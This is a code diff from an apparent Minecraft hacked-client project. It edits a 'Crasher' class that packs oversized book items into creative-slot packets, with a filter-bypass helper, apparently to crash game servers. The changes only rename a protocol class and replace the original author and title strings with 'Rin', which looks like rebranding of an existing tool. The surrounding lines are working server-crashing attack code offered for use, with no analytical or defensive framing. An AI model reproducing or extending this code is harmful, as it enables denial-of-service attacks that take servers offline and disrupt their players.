@@ -11,7 +11,7 @@ import net.minecraft.world.item.Items;
 import us.whitedev.crashers.Crasher;
 import us.whitedev.gui.clickgui.ClickGui;
 import us.whitedev.helpers.PacketHelper;
-import us.whitedev.protocol.XynisProtocol;
+import us.whitedev.protocol.RedSignalProtocol;
 import us.whitedev.protocol.components.data.DataComponents;
 import us.whitedev.protocol.components.data.impl.DataWritableBookContent;
 import us.whitedev.protocol.components.data.impl.DataWrittenBookContent;
@@ -58,7 +58,7 @@ public class Creative1 implements Crasher {
         PacketCreativeSlot dataPacket;
 
         int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
-        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
+        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
             nbtPacket = null;
             dataPacket = getDataBookPacket(pages, chars, genType, bookType, protocol);
         } else {
@@ -88,8 +88,8 @@ public class Creative1 implements Crasher {
         CompoundTag comp = new CompoundTag();
         ListTag list = new ListTag();
         for (int i = 0; i < pages; i++) list.add(new StringTag(s.toString()));
-        comp.putString("author", "0whitedev");
-        comp.putString("title", "madeq");
+        comp.putString("author", "Rin");
+        comp.putString("title", "Rin");
         comp.putByte("resolved", (byte) 1);
         comp.put("pages", list);
         ItemStack itemStack = new ItemStack(bookType.equals("normal") ? Items.WRITABLE_BOOK : Items.WRITTEN_BOOK, 1, Optional.of(comp));
@@ -115,7 +115,7 @@ public class Creative1 implements Crasher {
             CompoundTag pageText = bypassHelper.convert(bypassHelper.generateString(chars, genType));
             List<Filterable<Tag>> pagesList = new ArrayList<>();
             for (int i = 0; i < pages; i++) pagesList.add(new Filterable<>(pageText, null));
-            DataWrittenBookContent dataWrittenBookContent = new DataWrittenBookContent(new Filterable<>("madeq", null), "0whitedev", 1, pagesList, true);
+            DataWrittenBookContent dataWrittenBookContent = new DataWrittenBookContent(new Filterable<>("Rin", null), "Rin", 1, pagesList, true);
 
             DataComponents dataComponents = new DataComponents();
             dataComponents.put(dataWrittenBookContent);
